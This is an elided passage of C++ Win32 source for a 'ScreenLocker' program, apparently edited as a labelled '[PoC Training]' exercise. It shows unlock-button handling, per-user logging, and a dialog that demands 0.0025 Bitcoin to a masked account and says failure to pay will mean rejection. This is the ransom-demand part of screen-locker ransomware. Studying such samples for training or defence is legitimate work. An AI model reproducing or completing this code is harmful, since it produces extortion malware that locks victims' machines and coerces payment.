    ...
    switch (uMsg) {
        ...
        case WM_LBUTTONDOWN: {
            ...
            if (xPos >= buttonRect.left && xPos <= buttonRect.right && yPos >= buttonRect.top && yPos <= buttonRect.bottom) {
                ...
                // MODIFIED: Check dialogRunning instead of browserRunning
                if (pThis && !pThis->dialogRunning) {
                    ...
                    if (pThis->unlockClickCount == 0) {
                        ...
                        // MODIFIED: Use native dialog instead of browser
...
void ScreenLocker::HandleUnlockProcess() {
    SaveToLogFile(userID, "UNLOCK_PROCESS_STARTED_NATIVE_MODE");
    ShowNativeUnlockDialog();
    SaveToLogFile(userID, "UNLOCK_PROCESS_COMPLETED_NATIVE_MODE");
}
    ...
    switch (uMsg) {
        case WM_CREATE: {
            if (pThis) {
                ...
                // Create subtitle
                CreateWindowW(L"STATIC", L"[PoC Training] Unlock Request Portal", 
                    WS_VISIBLE | WS_CHILD | SS_CENTER,
                    50, 50, 400, 20, hWnd, (HMENU)1002, pThis->hInstance, NULL);
                
                // Create info box
                CreateWindowW(L"STATIC", 
                    L"System Unlock Process\n\nSend 0.0025 Bitcoin to the account below.\nAfter sending, click 'Confirm' to proceed with unlocking.\nFailure to send will result in rejection\nAccount: xxx-xxxx-xxx.", 
                    WS_VISIBLE | WS_CHILD | SS_LEFT | WS_BORDER,
                    50, 90, 400, 80, hWnd, (HMENU)1003, pThis->hInstance, NULL);
                
                // User ID label
                CreateWindowW(L"STATIC", L"Your User ID:", 
                    WS_VISIBLE | WS_CHILD,
                    50, 190, 100, 20, hWnd, (HMENU)1004, pThis->hInstance, NULL);
                
                // User ID display (read-only)
                std::wstring wideUserID(pThis->userID.begin(), pThis->userID.end());
                HWND hUserID = CreateWindowW(L"EDIT", wideUserID.c_str(),
                    WS_VISIBLE | WS_CHILD | WS_BORDER | ES_READONLY | ES_CENTER,
                    50, 215, 300, 25, hWnd, (HMENU)1005, pThis->hInstance, NULL);
                
                // Confirm button
                CreateWindowW(L"BUTTON", L"Confirm",
                    WS_VISIBLE | WS_CHILD | WS_TABSTOP | BS_DEFPUSHBUTTON,
                    200, 270, 100, 30, hWnd, (HMENU)1006, pThis->hInstance, NULL);
